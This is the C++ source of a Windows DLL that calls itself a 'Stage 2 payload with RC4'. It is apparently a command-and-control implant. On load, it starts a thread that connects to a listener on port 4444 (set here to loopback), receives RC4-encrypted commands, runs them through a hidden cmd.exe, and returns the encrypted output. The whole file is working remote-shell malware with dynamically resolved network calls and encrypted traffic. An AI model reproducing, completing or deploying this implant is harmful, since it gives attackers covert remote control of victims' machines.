// payload.cpp

#include <winsock2.h>
#include <windows.h>
#include <stdint.h>
#include <cstdio>
#include <string>
#include <vector>

#pragma pack(push, 1)
struct ProtocolHeader {
    uint8_t magic;
    uint8_t sender;
    uint16_t command;
    uint32_t data_length;
};
#pragma pack(pop)

#define MAGIC_BYTE 0x53
#define SENDER_DLL 0x02
#define CMD_DLL_HEARTBEAT 0x0002
#define CMD_EXEC_CMD 0x0003

static char g_rc4Key[64] = { 0 };
static int g_rc4KeyLen = 0;

std::string fnBase64Decode(const std::string& szInput)
{
    if (szInput.empty())
        return "";

    DWORD nDecodedLength = 0;
    CryptStringToBinaryA(szInput.c_str(), (DWORD)szInput.length(), CRYPT_STRING_BASE64, NULL, &nDecodedLength, NULL, NULL);
    if (nDecodedLength == 0)
        return "";

    std::vector<char> abDecoded(nDecodedLength);
    if (CryptStringToBinaryA(szInput.c_str(), (DWORD)szInput.length(), CRYPT_STRING_BASE64, (BYTE *)abDecoded.data(), &nDecodedLength, NULL, NULL))
        return std::string(abDecoded.data(), nDecodedLength);

    return "";
}

void rc4_crypt_buf(const char* key, int key_len, char* data, int data_len)
{
    unsigned char S[256];
    for (int i = 0; i < 256; i++)
        S[i] = (unsigned char)i;

    int j = 0;
    for (int i = 0; i < 256; i++)
    {
        j = (j + S[i] + key[i % key_len]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
    }

    int i = 0;
    j = 0;
    for (int n = 0; n < data_len; n++)
    {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
        data[n] ^= (char)S[(S[i] + S[j]) % 256];
    }
}

void ExecuteCommandAndReply(SOCKET s, const char* cmd, int(WINAPI *pSend)(SOCKET, const char*, int, int)) {
    char full_cmd[512];
    snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /c %s", cmd);

    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
    {
        const char* err_msg = "[-] Failed to create pipe.";
        uint32_t len = (uint32_t)strlen(err_msg);
        pSend(s, (char*)&len, 4, 0);
        pSend(s, err_msg, len, 0);
        return;
    }

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.hStdInput = NULL;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA(NULL, full_cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
    {
        CloseHandle(hWritePipe);

        char buffer[4096];
        DWORD bytesRead;
        std::string output = "";

        while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
        {
            buffer[bytesRead] = '\0';
            output += buffer;
        }

        CloseHandle(hReadPipe);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        if (output.empty())
        {
            output = "[+] Command executed successfully (no output).\r\n";
        }

        std::string encrypted_output = output;
        rc4_crypt_buf(g_rc4Key, g_rc4KeyLen, (char*)encrypted_output.data(), (int)encrypted_output.length());

        uint32_t out_len = (uint32_t)encrypted_output.length();
        pSend(s, (char*)&out_len, 4, 0);
        pSend(s, encrypted_output.data(), out_len, 0);
    }
    else
    {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        const char* err_msg = "[-] Failed to spawn process.";
        uint32_t len = (uint32_t)strlen(err_msg);
        pSend(s, (char*)&len, 4, 0);
        pSend(s, err_msg, len, 0);
    }
}

DWORD WINAPI C2CommunicationThread(LPVOID lpParam)
{
    HMODULE hWs2 = LoadLibraryA("ws2_32.dll");
    if (!hWs2)
        return 0;

    auto pWSAStartup = (int(WINAPI*)(WORD, LPWSADATA))GetProcAddress(hWs2, "WSAStartup");
    auto pSocket = (SOCKET(WINAPI*)(int, int, int))GetProcAddress(hWs2, "socket");
    auto pConnect = (int(WINAPI*)(SOCKET, const sockaddr*, int))GetProcAddress(hWs2, "connect");
    auto pSend = (int(WINAPI*)(SOCKET, const char*, int, int))GetProcAddress(hWs2, "send");
    auto pRecv = (int(WINAPI*)(SOCKET, char*, int, int))GetProcAddress(hWs2, "recv");
    auto pCloseSocket = (int(WINAPI*)(SOCKET))GetProcAddress(hWs2, "closesocket");

    WSADATA wsaData;
    if (pWSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return 0;

    SOCKET s = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET)
        return 0;

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(4444);
    serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    if (pConnect(s, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) != 0)
    {
        pCloseSocket(s);
        return 0;
    }

    ProtocolHeader pkt;
    pkt.magic = MAGIC_BYTE;
    pkt.sender = SENDER_DLL; 
    pkt.command = CMD_DLL_HEARTBEAT;
    pkt.data_length = 0;
    pSend(s, (char*)&pkt, sizeof(pkt), 0);

    while (true)
    {
        char header_buf[8];
        int totalReceived = 0;
        while (totalReceived < 8)
        {
            int r = pRecv(s, header_buf + totalReceived, 8 - totalReceived, 0);
            if (r <= 0)
                break;

            totalReceived += r;
        }

        if (totalReceived < 8)
            break;

        uint8_t magic = header_buf[0];
        uint8_t sender = header_buf[1];
        uint16_t command = *(uint16_t*)(header_buf + 2);
        uint32_t data_len = *(uint32_t*)(header_buf + 4);

        if (magic != MAGIC_BYTE || command != CMD_EXEC_CMD)
            break;

        char* cmd_buf = new char[data_len + 1];
        totalReceived = 0;
        while (totalReceived < (int)data_len)
        {
            int r = pRecv(s, cmd_buf + totalReceived, data_len - totalReceived, 0);
            if (r <= 0)
                break;

            totalReceived += r;

        }

        cmd_buf[data_len] = '\0';

        rc4_crypt_buf(g_rc4Key, g_rc4KeyLen, cmd_buf, data_len);

        ExecuteCommandAndReply(s, cmd_buf, pSend);

        delete[] cmd_buf;
    }

    pCloseSocket(s);

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            MessageBoxA(NULL, "Stage 2 payload with RC4", "StummSchneide", MB_OK | MB_ICONINFORMATION);
            DisableThreadLibraryCalls(hinstDLL);

            if (lpvReserved != NULL)
            {
                char* keyPtr = (char*)lpvReserved;
                g_rc4KeyLen = (int)strlen(keyPtr);
                if (g_rc4KeyLen > 0 && g_rc4KeyLen < 64)
                {
                    memcpy(g_rc4Key, keyPtr, g_rc4KeyLen);
                }
            }
            
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)C2CommunicationThread, NULL, 0, NULL);

            break;
    }
    return TRUE;
}